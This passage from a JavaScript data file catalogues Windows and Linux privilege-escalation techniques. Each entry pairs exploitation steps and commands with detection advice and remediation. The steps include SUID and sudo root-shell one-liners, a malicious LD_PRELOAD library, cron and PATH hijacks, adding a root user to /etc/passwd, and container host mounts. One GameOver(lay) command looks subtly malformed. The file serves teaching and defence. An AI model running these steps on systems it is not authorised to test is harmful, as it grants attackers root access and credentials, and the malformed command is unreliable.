      detection: "Check for GUI applications running as SYSTEM with Task Manager. Monitor for cmd.exe or explorer.exe spawned as child processes of unexpected GUI applications.",
      exploitation: "In the Open/Save dialog: navigate to C:\\Windows\\System32, type cmd.exe in the filename field, right-click and select Open. Or use the Address Bar to navigate to a command prompt.",
      command: "tasklist /v /fi \"USERNAME eq SYSTEM\" | findstr /i gui",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: [],
      remediation: "Don't run GUI applications as SYSTEM. Use least privilege for all applications. Disable file dialogs in SYSTEM-level applications."
    },
    {
      name: "Startup Applications Folder",
      os: "Windows",
      category: "Miscellaneous",
      description: "The All Users startup folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup) runs programs for all users at logon. If this folder is writable by a low-privileged user, persistence can be achieved for any user who logs in, including administrators.",
      detection: "Monitor file creation in startup folders (Sysmon Event 11). Check folder permissions with icacls. Autoruns.exe shows all startup entries.",
      exploitation: "icacls 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' — check write access. Copy malicious executable or shortcut to the folder. Wait for an admin to log on.",
      command: "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"",
      mitre: "T1547.001 - Registry Run Keys / Startup Folder",
      tools: ["WinPEAS", "Autoruns", "icacls"],
      remediation: "Restrict startup folder write permissions to Administrators only. Monitor startup folder for changes. Use AppLocker to control what can execute."
    },
    {
      name: "Cached GPP Passwords (MS14-025)",
      os: "Windows",
      category: "Credential Access",
      description: "Group Policy Preferences (GPP) allowed admins to set local passwords via Group Policy. The password was stored in an XML file in SYSVOL, encrypted with a publicly known AES key (published by Microsoft). Any domain user can read SYSVOL and decrypt these passwords.",
      detection: "Search for Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml, Drives.xml, Printers.xml in \\\\domain\\SYSVOL. Look for cpassword attributes in GPP XML files.",
      exploitation: "findstr /S /I cpassword \\\\domain.com\\sysvol\\domain.com\\policies\\*.xml. Then: gpp-decrypt <cpassword_value>. Or: Get-GPPPassword (PowerSploit).",
      command: "findstr /S /I cpassword \\\\%USERDNSDOMAIN%\\sysvol\\%USERDNSDOMAIN%\\policies\\*.xml",
      mitre: "T1552.006 - Group Policy Preferences",
      tools: ["Get-GPPPassword", "gpp-decrypt", "metasploit smb_enum_gpp", "CrackMapExec"],
      remediation: "Apply MS14-025 patch. Remove existing GPP with cpassword. Use LAPS instead. Delete old GPP XML files from SYSVOL."
    }
  ],
  linux: [
    // ═══════════════════════════════════════════════════════════════
    // SUID/SGID BINARIES
    // ═══════════════════════════════════════════════════════════════
    {
      name: "SUID Binary Exploitation",
      os: "Linux",
      category: "SUID/SGID",
      description: "SUID (Set User ID) binaries execute with the file owner's privileges, typically root. If a SUID binary has a vulnerability or allows arbitrary command execution, it can be used for privilege escalation. GTFOBins catalogs exploitable SUID binaries.",
      detection: "find / -perm -4000 -type f 2>/dev/null — enumerate all SUID binaries. Compare against baseline. Monitor for new SUID binaries (auditd rule on chmod with SUID). Alert on SUID set on non-standard binaries.",
      exploitation: "find / -perm -4000 2>/dev/null — find SUID binaries. Check GTFOBins for exploitation techniques. Common exploitable SUID: find, vim, nmap (old), python, perl, bash, env, cp, mv, less, nano, awk.",
      command: "find / -perm -u=s -type f 2>/dev/null",
      mitre: "T1548.001 - Setuid and Setgid",
      tools: ["GTFOBins", "LinPEAS", "Linux Exploit Suggester"],
      remediation: "Remove SUID bit from unnecessary binaries: chmod u-s /path/to/binary. Use capabilities instead of SUID where possible. Regularly audit SUID binaries."
    },
    {
      name: "SUID find Command",
      os: "Linux",
      category: "SUID/SGID",
      description: "If /usr/bin/find has the SUID bit set, the -exec flag can be used to execute commands as root. One of the most common and straightforward SUID privilege escalations.",
      detection: "ls -la /usr/bin/find — check for SUID bit (s in permissions). Auditd rule: -a always,exit -F path=/usr/bin/find -F perm=x -F auid>=1000 -k suid_find",
      exploitation: "find . -exec /bin/sh -p \\; — spawns a root shell. The -p flag preserves the effective UID (prevents bash from dropping SUID privileges).",
      command: "find . -exec /bin/sh -p \\; -quit",
      mitre: "T1548.001 - Setuid and Setgid",
      tools: ["find"],
      remediation: "chmod u-s /usr/bin/find. Use capabilities (cap_dac_read_search+ep) if find needs elevated access."
    },
    {
      name: "SUID Custom Binary",
      os: "Linux",
      category: "SUID/SGID",
      description: "Custom SUID binaries developed in-house often have vulnerabilities: buffer overflows, command injection through unsanitized environment variables, relative path execution, or library loading issues. These are high-value targets during penetration testing.",
      detection: "find / -perm -4000 ! -path '*/proc/*' 2>/dev/null | xargs file — identify custom binaries (not part of standard packages). ltrace/strace on SUID binaries to understand their behavior.",
      exploitation: "strings <binary> — look for system(), popen(), exec() calls. ltrace <binary> — trace library calls. strace <binary> — trace system calls. Check for relative paths (PATH hijacking), environment variable injection, buffer overflows.",
      command: "find / -perm -4000 -type f 2>/dev/null | xargs dpkg -S 2>/dev/null | grep 'not found'",
      mitre: "T1548.001 - Setuid and Setgid",
      tools: ["strings", "ltrace", "strace", "gdb", "ghidra", "radare2"],
      remediation: "Avoid creating SUID binaries. Use capabilities or sudo rules instead. If SUID is necessary, perform thorough security review and use secure coding practices."
    },
    // ═══════════════════════════════════════════════════════════════
    // SUDO MISCONFIGURATIONS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Sudo NOPASSWD Misconfiguration",
      os: "Linux",
      category: "Sudo Misconfiguration",
      description: "sudoers rules with NOPASSWD allow executing commands without a password. If the allowed command can spawn a shell or execute arbitrary commands (GTFOBins), it provides root access. Common misconfiguration: user ALL=(ALL) NOPASSWD: /usr/bin/vim",
      detection: "sudo -l — list current user's sudo permissions. Check /etc/sudoers and /etc/sudoers.d/* for NOPASSWD entries. Alert on sudoers modifications (auditd on /etc/sudoers).",
      exploitation: "sudo -l — check what commands are available. If vim: sudo vim -c ':!bash'. If less: sudo less /etc/hosts then !bash. If find: sudo find / -exec /bin/bash \\;. If awk: sudo awk 'BEGIN {system(\"/bin/bash\")}'.",
      command: "sudo -l",
      mitre: "T1548.003 - Sudo and Sudo Caching",
      tools: ["GTFOBins", "LinPEAS", "sudo -l"],
      remediation: "Minimize NOPASSWD entries. Use specific commands with full paths. Avoid granting sudo access to interpreters (python, perl, ruby), editors (vim, nano), pagers (less, more), or file utilities (find, awk, tar)."
    },
    {
      name: "Sudo LD_PRELOAD",
      os: "Linux",
      category: "Sudo Misconfiguration",
      description: "If the sudoers configuration preserves LD_PRELOAD (env_keep += LD_PRELOAD) or doesn't reset the environment, a shared library can be loaded into any sudo command, executing arbitrary code as root before the intended program runs.",
      detection: "sudo -l — check for env_keep entries including LD_PRELOAD. Check /etc/sudoers for Defaults !env_reset or env_keep. Monitor for unusual shared libraries being loaded.",
      exploitation: "1. Create malicious shared library: void _init() { setuid(0); system('/bin/bash -p'); }. 2. gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles. 3. sudo LD_PRELOAD=/tmp/evil.so <any_allowed_sudo_command>.",
      command: "sudo -l | grep -i env_keep",
      mitre: "T1574.006 - Dynamic Linker Hijacking",
      tools: ["gcc", "LinPEAS"],
      remediation: "Ensure sudoers has: Defaults env_reset. Remove LD_PRELOAD, LD_LIBRARY_PATH, and PYTHONPATH from env_keep. Use the secure_path option."
    },
    {
      name: "Sudo env_keep PATH Abuse",
      os: "Linux",
      category: "Sudo Misconfiguration",
      description: "If sudoers preserves the PATH variable (env_keep += PATH) and a sudo command uses relative paths internally (calling 'service' instead of '/usr/sbin/service'), an attacker can create a malicious binary with the same name in a directory they control and prepend it to PATH.",
      detection: "sudo -l — check for env_keep with PATH. Strings/ltrace on sudo-allowed binaries to find relative path usage. Check if secure_path is set in sudoers.",
      exploitation: "1. sudo -l shows: (root) NOPASSWD: /opt/scripts/backup.sh. 2. strings /opt/scripts/backup.sh shows it calls 'tar' (relative path). 3. echo '/bin/bash -p' > /tmp/tar && chmod +x /tmp/tar. 4. export PATH=/tmp:$PATH && sudo /opt/scripts/backup.sh.",
      command: "sudo -l | grep env_keep",
      mitre: "T1574.007 - Path Interception by PATH Environment Variable",
      tools: ["strings", "LinPEAS"],
      remediation: "Use Defaults secure_path in sudoers. Use absolute paths in all scripts. Don't preserve PATH in env_keep."
    },
    {
      name: "Sudo CVE-2021-3156 (Baron Samedit)",
      os: "Linux",
      category: "Sudo Vulnerability",
      description: "Heap-based buffer overflow in sudo versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1. Allows any local user to gain root privileges without needing sudo permissions. Triggered by: sudoedit -s '\\' followed by a specially crafted argument.",
      detection: "Check sudo version: sudo --version. Test vulnerability: sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)') — if it crashes or returns 'sudoedit:' error, it's likely vulnerable. If it says 'usage:', it's patched.",
      exploitation: "Multiple public exploits available. python3 exploit_nss.py — automatic exploitation. Manual: sudoedit -s '\\' + heap spray payload.",
      command: "sudo --version && sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["CVE-2021-3156 exploits", "Linux Exploit Suggester"],
      remediation: "Update sudo to version 1.9.5p2 or later. Apply distribution security patches immediately."
    },
    {
      name: "Sudo CVE-2019-14287 (sudo -u#-1)",
      os: "Linux",
      category: "Sudo Vulnerability",
      description: "In sudo versions before 1.8.28, a user with a sudoers entry allowing them to run commands as any user except root (e.g., (ALL, !root) NOPASSWD: /bin/bash) could bypass the restriction by specifying user ID -1 or 4294967295, which sudo resolved to UID 0 (root).",
      detection: "Check sudo version: sudo --version. Check for sudoers rules with !root exclusion. Versions before 1.8.28 are vulnerable.",
      exploitation: "sudo -u#-1 /bin/bash — spawns a root shell even when the sudoers rule explicitly excludes root. Alternative: sudo -u#4294967295 /bin/bash.",
      command: "sudo -u#-1 id",
      mitre: "T1548.003 - Sudo and Sudo Caching",
      tools: ["sudo"],
      remediation: "Update sudo to 1.8.28 or later. Avoid (ALL, !root) patterns — use explicit user lists instead."
    },
    // ═══════════════════════════════════════════════════════════════
    // CRON JOB ABUSE
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Writable Cron Script",
      os: "Linux",
      category: "Cron Job Abuse",
      description: "If a cron job runs a script that is writable by the current user, modifying the script achieves code execution as the cron job's user (often root). Common with world-writable backup scripts or cleanup scripts.",
      detection: "cat /etc/crontab && ls -la /etc/cron.* && crontab -l. Check permissions of all scripts referenced in cron entries. find / -writable -name '*.sh' 2>/dev/null to find writable scripts.",
      exploitation: "1. cat /etc/crontab — find cron jobs. 2. ls -la /path/to/cron/script.sh — check if writable. 3. echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/cron/script.sh. 4. Wait for cron execution. 5. /tmp/rootbash -p.",
      command: "cat /etc/crontab && ls -la /etc/cron.d/ && for f in $(grep -r '/' /etc/crontab /etc/cron.d/ 2>/dev/null | grep -oP '/\\S+\\.sh'); do ls -la $f 2>/dev/null; done",
      mitre: "T1053.003 - Cron",
      tools: ["LinPEAS", "pspy"],
      remediation: "Ensure cron scripts are owned by root and not writable by other users (chmod 700 or 755, owned by root). Use absolute paths in cron entries."
    },
    {
      name: "Cron PATH Hijacking",
      os: "Linux",
      category: "Cron Job Abuse",
      description: "If a cron job uses a relative command (e.g., 'backup.sh' instead of '/usr/local/bin/backup.sh') and the PATH variable in the crontab includes writable directories, a malicious binary can be placed in the first writable PATH directory.",
      detection: "Check PATH in /etc/crontab. Check if cron scripts use relative paths for commands. Check write permissions on PATH directories.",
      exploitation: "1. cat /etc/crontab — shows PATH=/home/user:/usr/local/bin:/usr/bin. 2. Cron entry: * * * * * root backup.sh. 3. echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/backup.sh && chmod +x /home/user/backup.sh.",
      command: "cat /etc/crontab | head -5",
      mitre: "T1053.003 - Cron",
      tools: ["LinPEAS", "pspy"],
      remediation: "Always use absolute paths in cron jobs. Set a restrictive PATH in crontab. Don't include user-writable directories in the cron PATH."
    },
    {
      name: "Cron Wildcard Injection",
      os: "Linux",
      category: "Cron Job Abuse",
      description: "When a cron job uses wildcards (*) with commands like tar, chown, chmod, or rsync, specially crafted filenames can be interpreted as command-line flags. Example: a file named '--checkpoint-action=exec=sh shell.sh' will be passed as a flag to tar.",
      detection: "grep -r '\\*' /etc/crontab /etc/cron.d/ — find cron jobs using wildcards. Check if tar, chown, chmod, or rsync is used with wildcard expansion in writable directories.",
      exploitation: "For tar with wildcard: echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh' && echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh. When tar runs with *, these filenames become tar flags.",
      command: "grep -r '\\*' /etc/crontab /etc/cron.d/ 2>/dev/null",
      mitre: "T1053.003 - Cron",
      tools: ["LinPEAS", "pspy"],
      remediation: "Avoid wildcards in cron jobs. If necessary, use find with -exec instead of shell globbing. Use -- to separate options from arguments."
    },
    // ═══════════════════════════════════════════════════════════════
    // LINUX CAPABILITIES
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Linux Capabilities Abuse",
      os: "Linux",
      category: "Capabilities",
      description: "Linux capabilities provide fine-grained privileges without full root. Misconfigured capabilities can allow privilege escalation: cap_setuid allows changing UID, cap_dac_override bypasses file permissions, cap_sys_admin allows mounting filesystems and loading kernel modules.",
      detection: "getcap -r / 2>/dev/null — enumerate binaries with capabilities. Common dangerous capabilities: cap_setuid, cap_setgid, cap_dac_override, cap_dac_read_search, cap_sys_admin, cap_sys_ptrace, cap_fowner.",
      exploitation: "If python has cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'. If vim has cap_dac_override: vim can read/write any file. If any binary has cap_sys_admin: can mount filesystems or use bpf for kernel interaction.",
      command: "getcap -r / 2>/dev/null",
      mitre: "T1548.001 - Setuid and Setgid",
      tools: ["LinPEAS", "getcap", "GTFOBins"],
      remediation: "Audit capabilities regularly. Remove unnecessary capabilities. Use the principle of least privilege when assigning capabilities. setcap -r /path/to/binary to remove capabilities."
    },
    // ═══════════════════════════════════════════════════════════════
    // WRITABLE /etc/passwd
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Writable /etc/passwd",
      os: "Linux",
      category: "File Permission",
      description: "If /etc/passwd is writable by the current user, a new root-level user can be added directly. The password hash can be placed in /etc/passwd (legacy format), bypassing /etc/shadow. Alternatively, the root user's password hash can be replaced.",
      detection: "ls -la /etc/passwd — check for write permissions. Monitor /etc/passwd modifications with auditd: -w /etc/passwd -p wa -k passwd_changes.",
      exploitation: "openssl passwd -1 -salt root newpassword — generate password hash. echo 'hacker:$1$root$...:0:0:root:/root:/bin/bash' >> /etc/passwd — add new root user. Or: Replace root's 'x' in the second field with a generated hash to set root's password directly.",
      command: "ls -la /etc/passwd && ls -la /etc/shadow",
      mitre: "T1098 - Account Manipulation",
      tools: ["openssl", "LinPEAS"],
      remediation: "Set /etc/passwd permissions to 644 owned by root:root. Use /etc/shadow for password storage (should be 640 root:shadow). Monitor file permission changes."
    },
    // ═══════════════════════════════════════════════════════════════
    // NFS no_root_squash
    // ═══════════════════════════════════════════════════════════════
    {
      name: "NFS no_root_squash",
      os: "Linux",
      category: "NFS Misconfiguration",
      description: "When an NFS share is exported with no_root_squash, remote root users maintain root privileges on the share. By default, NFS 'squashes' root to nobody/nogroup. With no_root_squash, an attacker with root on any machine can create SUID binaries on the NFS share.",
      detection: "showmount -e <target> — list NFS exports. cat /etc/exports — check export options on the server. Look for no_root_squash in export entries.",
      exploitation: "1. showmount -e target — find exports. 2. mount -t nfs target:/share /mnt — mount the share as root. 3. cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash — create SUID binary on the share. 4. On the target, run /share/rootbash -p for root shell.",
      command: "showmount -e target_ip && cat /etc/exports 2>/dev/null",
      mitre: "T1548.001 - Setuid and Setgid",
      tools: ["showmount", "mount", "LinPEAS"],
      remediation: "Use root_squash (default) in NFS exports. Restrict NFS access to specific IPs. Use NFSv4 with Kerberos authentication. Set nosuid mount option on clients."
    },
    // ═══════════════════════════════════════════════════════════════
    // DOCKER / LXD GROUP
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Docker Group Privilege Escalation",
      os: "Linux",
      category: "Container Escape",
      description: "Members of the docker group can run containers with arbitrary options, including mounting the host filesystem. By mounting / into a container, full read/write access to the host filesystem is achieved, effectively providing root access.",
      detection: "id — check if user is in docker group. groups — list group memberships. Monitor docker commands with auditd: -w /usr/bin/docker -p x -k docker_exec.",
      exploitation: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh — mount host root into container and chroot. docker run -v /:/mnt -it alpine sh -c 'cp /bin/bash /mnt/tmp/rootbash; chmod +s /mnt/tmp/rootbash' — create SUID bash on host.",
      command: "id | grep docker && docker images",
      mitre: "T1611 - Escape to Host",
      tools: ["docker", "LinPEAS"],
      remediation: "Only add trusted users to the docker group. Use rootless Docker. Implement Docker socket protection with authz plugins. Consider Podman (rootless by default)."
    },
    {
      name: "LXD/LXC Group Privilege Escalation",
      os: "Linux",
      category: "Container Escape",
      description: "Members of the lxd group can create privileged containers with the host filesystem mounted. Similar to Docker, this provides full host root access. The user doesn't need to import an image from the internet — a minimal Alpine image can be imported locally.",
      detection: "id — check if user is in lxd or lxc group. Monitor lxc commands. Check for LXD socket at /var/snap/lxd/common/lxd/unix.socket.",
      exploitation: "1. Build Alpine image: git clone https://github.com/saghul/lxd-alpine-builder && ./build-alpine. 2. Import: lxc image import alpine.tar.gz --alias alpine. 3. Init privileged container: lxc init alpine privesc -c security.privileged=true. 4. Mount host: lxc config device add privesc host-root disk source=/ path=/mnt/root. 5. lxc start privesc && lxc exec privesc /bin/sh.",
      command: "id | grep lxd && lxc image list",
      mitre: "T1611 - Escape to Host",
      tools: ["lxc", "lxd-alpine-builder", "LinPEAS"],
      remediation: "Only add trusted users to the lxd group. Implement proper access controls for LXD. Consider using unprivileged containers."
    },
    // ═══════════════════════════════════════════════════════════════
    // KERNEL EXPLOITS
    // ═══════════════════════════════════════════════════════════════
    {
      name: "DirtyPipe (CVE-2022-0847)",
      os: "Linux",
      category: "Kernel Exploit",
      description: "Linux kernel vulnerability (5.8 through 5.16.10) allowing overwriting data in arbitrary read-only files. Can modify /etc/passwd to add a root user or overwrite SUID binaries. Reliable, instant exploitation without race conditions.",
      detection: "uname -r — check kernel version (5.8 <= version <= 5.16.10 is vulnerable). Monitor for writes to read-only files. Check for exploitation artifacts in /etc/passwd.",
      exploitation: "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 1 '${openssl_hash}:0:0::/root:/bin/bash\\n' — overwrites root's password entry at offset 1. Or target SUID binary: ./dirtypipe /usr/bin/su — overwrite SUID binary with shellcode.",
      command: "uname -r",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["CVE-2022-0847 exploits", "Linux Exploit Suggester"],
      remediation: "Update kernel to 5.16.11, 5.15.25, or 5.10.102+. Apply distribution security patches."
    },
    {
      name: "DirtyCow (CVE-2016-5195)",
      os: "Linux",
      category: "Kernel Exploit",
      description: "Race condition in the Linux kernel's memory subsystem (copy-on-write) allowing a local user to gain write access to read-only memory mappings. Affects kernels before 4.8.3. Multiple exploit variants: write to /etc/passwd, overwrite SUID binaries, or modify read-only files.",
      detection: "uname -r — check kernel version (before 4.8.3 is vulnerable). Monitor for unusual file modification patterns. Check dmesg for memory mapping anomalies.",
      exploitation: "gcc -pthread dirtyc0w.c -o dirtyc0w && ./dirtyc0w /etc/passwd 'root:$hash:0:0::/root:/bin/bash' — overwrite /etc/passwd with root password. Alternative: cowroot exploit creates SUID shell directly.",
      command: "uname -r",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["dirtycow exploits", "cowroot", "Linux Exploit Suggester"],
      remediation: "Update kernel to 4.8.3 or later. Apply distribution security patches. Use security modules (SELinux, AppArmor) to limit impact."
    },
    {
      name: "PwnKit (CVE-2021-4034)",
      os: "Linux",
      category: "Kernel/Userspace Exploit",
      description: "Memory corruption vulnerability in polkit's pkexec (SUID root binary). Affects all major Linux distributions. Exploitable by any unprivileged local user. Vulnerability existed for 12+ years (since May 2009). Trivially exploitable with public exploits.",
      detection: "pkexec --version — check polkit version. dpkg -l policykit-1 or rpm -qa polkit. Monitor for unusual pkexec executions. Watch for GCONV_PATH environment variable manipulation.",
      exploitation: "gcc pwnkit.c -o pwnkit && ./pwnkit — instant root shell. Python version: python3 CVE-2021-4034.py. The exploit is extremely reliable with no race conditions.",
      command: "pkexec --version 2>/dev/null || dpkg -l policykit-1 2>/dev/null || rpm -qa polkit 2>/dev/null",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["PwnKit", "CVE-2021-4034 exploits", "Linux Exploit Suggester"],
      remediation: "Update polkit package. Apply distribution patches. Remove SUID from pkexec if not needed: chmod 0755 /usr/bin/pkexec."
    },
    {
      name: "GameOver(lay) (CVE-2023-2640 / CVE-2023-32629)",
      os: "Linux",
      category: "Kernel Exploit",
      description: "Ubuntu-specific kernel vulnerability in OverlayFS. An unprivileged user can set privileged extended attributes on mounted files, allowing creation of SUID binaries through overlayfs. Affects Ubuntu kernels with specific OverlayFS patches.",
      detection: "uname -r — check for Ubuntu kernel. cat /etc/os-release for Ubuntu version. Monitor for overlayfs mounts by unprivileged users.",
      exploitation: "unshare -rm sh -c 'mkdir l u w m; cp /u*/b*/p]*/teleport l/; mount -t overlay overlay -o lowerdir=l,upperdir=u,workdir=w m; touch m/--hierarchical; setcap cap_setuid+eip m/teleport; mount -t proc proc /proc' && ./u/teleport",
      command: "uname -r && cat /etc/os-release | grep -i ubuntu",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["CVE-2023-2640 exploits"],
      remediation: "Apply Ubuntu security patches. Update kernel. Restrict user namespace creation if not needed."
    },
    {
      name: "DirtyCredential (CVE-2022-2588)",
      os: "Linux",
      category: "Kernel Exploit",
      description: "Use-after-free vulnerability in the Linux kernel's route4_filter. Can be exploited for local privilege escalation. Affects kernels before 5.19. The vulnerability allows corrupting kernel credentials to elevate privileges.",
      detection: "uname -r — check kernel version. Monitor for unusual kernel module loading. Check dmesg for use-after-free warnings.",
      exploitation: "Requires compiled exploit for specific kernel version. More complex than DirtyPipe/PwnKit but still reliable.",
      command: "uname -r",
      mitre: "T1068 - Exploitation for Privilege Escalation",
      tools: ["CVE-2022-2588 exploit", "Linux Exploit Suggester"],
      remediation: "Update to kernel 5.19+. Apply distribution security patches."
    },
    // ═══════════════════════════════════════════════════════════════
    // PATH HIJACKING
    // ═══════════════════════════════════════════════════════════════
    {
      name: "PATH Variable Hijacking",
      os: "Linux",
      category: "Path Hijacking",
      description: "If a privileged script or SUID binary calls a command using a relative path (e.g., 'service' instead of '/usr/sbin/service'), an attacker can create a malicious binary with the same name in a writable directory and prepend that directory to PATH.",
      detection: "strings <binary> — look for relative command paths. ltrace <binary> — trace library calls including system(). strace <binary> — trace system calls. Check for scripts using relative paths in privileged contexts.",
      exploitation: "1. strings /usr/local/bin/suid_binary | grep -v '/' — find commands without full paths. 2. echo '#!/bin/bash\\nbash -p' > /tmp/service && chmod +x /tmp/service. 3. export PATH=/tmp:$PATH. 4. /usr/local/bin/suid_binary — triggers /tmp/service instead of /usr/sbin/service.",
      command: "echo $PATH && find / -perm -4000 -type f 2>/dev/null | xargs strings 2>/dev/null | grep -E '^[a-z]' | sort -u",
      mitre: "T1574.007 - Path Interception by PATH Environment Variable",
      tools: ["strings", "ltrace", "strace", "LinPEAS"],
      remediation: "Always use absolute paths in scripts and compiled binaries. Set a restrictive PATH in privileged contexts. Use secure_path in sudoers."
    },
    // ═══════════════════════════════════════════════════════════════
    // SHARED LIBRARY INJECTION
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Shared Library Injection (LD_PRELOAD)",
      os: "Linux",
      category: "Shared Library",
      description: "LD_PRELOAD allows loading a shared library before all others. If a SUID binary doesn't drop privileges before loading libraries, or if sudo preserves LD_PRELOAD, a malicious library can execute code as root before the intended program.",
      detection: "Check /etc/ld.so.preload for global preload entries. Monitor LD_PRELOAD environment variable usage. auditd rule: -a always,exit -F arch=b64 -S execve -k exec_monitor.",
      exploitation: "1. Create evil.c: void _init() { setuid(0); setgid(0); system(\"/bin/bash -p\"); }. 2. gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles. 3. If sudo preserves LD_PRELOAD: sudo LD_PRELOAD=/tmp/evil.so <any_allowed_command>.",
      command: "cat /etc/ld.so.preload 2>/dev/null && sudo -l | grep env_keep",
      mitre: "T1574.006 - Dynamic Linker Hijacking",
      tools: ["gcc", "LinPEAS"],
      remediation: "Ensure sudo has Defaults env_reset (removes LD_PRELOAD). Don't include LD_PRELOAD in env_keep. SUID binaries should drop privileges immediately."
    },
    {
      name: "Shared Library Hijacking (RPATH/RUNPATH)",
      os: "Linux",
      category: "Shared Library",
      description: "ELF binaries can have hardcoded library search paths (RPATH/RUNPATH). If these paths are writable by the current user, a malicious library can be placed there to hijack the library loading of a privileged binary.",
      detection: "readelf -d <binary> | grep -E 'RPATH|RUNPATH' — check for custom library paths. ldd <binary> — show linked libraries and their resolved paths. Check permissions on RPATH directories.",
      exploitation: "1. readelf -d /usr/local/bin/suid_app | grep RPATH — shows /usr/local/lib/app. 2. Check if writable: ls -la /usr/local/lib/app. 3. ldd /usr/local/bin/suid_app — find a library loaded from the RPATH. 4. Create malicious library with same name and required exports.",
      command: "find / -perm -4000 -type f 2>/dev/null | xargs readelf -d 2>/dev/null | grep -E 'RPATH|RUNPATH'",
      mitre: "T1574.006 - Dynamic Linker Hijacking",
      tools: ["readelf", "ldd", "patchelf", "LinPEAS"],
      remediation: "Avoid RPATH in production binaries. Use RUNPATH instead of RPATH (searched after LD_LIBRARY_PATH). Ensure library directories are only writable by root."
    },
    // ═══════════════════════════════════════════════════════════════
    // SYSTEMD TIMER ABUSE
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Writable Systemd Service/Timer",
      os: "Linux",
      category: "Systemd Abuse",
      description: "If systemd service unit files or their referenced scripts are writable by the current user, the service can be modified to execute arbitrary commands. Systemd timers are the modern replacement for cron and follow similar attack patterns.",
      detection: "systemctl list-timers — list active timers. find / -name '*.service' -writable 2>/dev/null && find / -name '*.timer' -writable 2>/dev/null. Check permissions on ExecStart scripts referenced in service files.",
      exploitation: "1. systemctl list-timers — find active timers. 2. systemctl cat <timer_name>.timer — find the associated service. 3. systemctl cat <service_name>.service — check ExecStart path. 4. If ExecStart script is writable, modify it to include: /bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'.",
      command: "systemctl list-timers --all && find /etc/systemd /usr/lib/systemd -writable -name '*.service' 2>/dev/null",
      mitre: "T1053.006 - Systemd Timers",
      tools: ["LinPEAS", "pspy", "systemctl"],
      remediation: "Ensure all service and timer files are owned by root with 644 permissions. Ensure ExecStart scripts are not writable by unprivileged users. Use systemd hardening options (ProtectSystem, PrivateTmp, NoNewPrivileges)."
    },
    // ═══════════════════════════════════════════════════════════════
    // MISCELLANEOUS LINUX PRIVESC
    // ═══════════════════════════════════════════════════════════════
    {
      name: "Writable /etc/shadow",
      os: "Linux",
      category: "File Permission",
      description: "If /etc/shadow is readable, password hashes can be extracted and cracked offline. If writable, root's password hash can be replaced directly. Shadow should be readable only by root and the shadow group.",
      detection: "ls -la /etc/shadow — check permissions (should be 640 or 600). Monitor access to /etc/shadow with auditd: -w /etc/shadow -p rwa -k shadow_access.",
      exploitation: "If readable: cat /etc/shadow | grep root — extract root hash for cracking with hashcat/john. If writable: Generate hash with openssl passwd -6 -salt xyz password, replace root's hash in /etc/shadow.",
      command: "ls -la /etc/shadow",
      mitre: "T1003.008 - /etc/passwd and /etc/shadow",
      tools: ["hashcat", "john", "openssl", "LinPEAS"],
      remediation: "Set /etc/shadow permissions to 640 root:shadow. Monitor for permission changes. Use strong password hashing (yescrypt or SHA-512 with high rounds)."
    },
    {
      name: "Python Library Hijacking",
      os: "Linux",
      category: "Library Hijacking",
      description: "If a privileged Python script imports a module and the module can be overwritten, or if a user-writable directory appears earlier in sys.path, a malicious module can be substituted. Common with scripts that import custom modules without absolute imports.",
      detection: "python3 -c 'import sys; print(sys.path)' — check Python path. Find writable directories in the Python path. Check permissions on imported modules used by privileged scripts.",
      exploitation: "1. Find a SUID Python script or a cron job running a Python script as root. 2. Check which modules it imports. 3. Create a malicious version: echo 'import os; os.system(\"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\")' > /writable/path/module.py. 4. Wait for execution.",
      command: "python3 -c 'import sys; print(\"\\n\".join(sys.path))'",
      mitre: "T1574.006 - Dynamic Linker Hijacking",
      tools: ["LinPEAS", "python3"],
      remediation: "Use absolute imports. Set PYTHONDONTWRITEBYTECODE=1. Ensure Python lib directories are not writable by unprivileged users. Use virtual environments."
    },
    {
      name: "Writable Docker Socket",
      os: "Linux",
      category: "Container Escape",
      description: "The Docker socket (/var/run/docker.sock) allows full control over Docker. If readable/writable by the current user (even without being in the docker group), the user can create privileged containers and escalate to root on the host.",
      detection: "ls -la /var/run/docker.sock — check permissions. find / -name docker.sock 2>/dev/null. Check if any web applications or APIs expose the Docker socket.",
      exploitation: "curl -s --unix-socket /var/run/docker.sock http://localhost/images/json — list images via API. docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh — mount host filesystem.",
      command: "ls -la /var/run/docker.sock",
      mitre: "T1611 - Escape to Host",
      tools: ["docker", "curl", "LinPEAS"],
      remediation: "Restrict Docker socket permissions (660 root:docker). Don't mount Docker socket into containers. Use rootless Docker. Implement Docker socket proxy with AuthZ."
    },
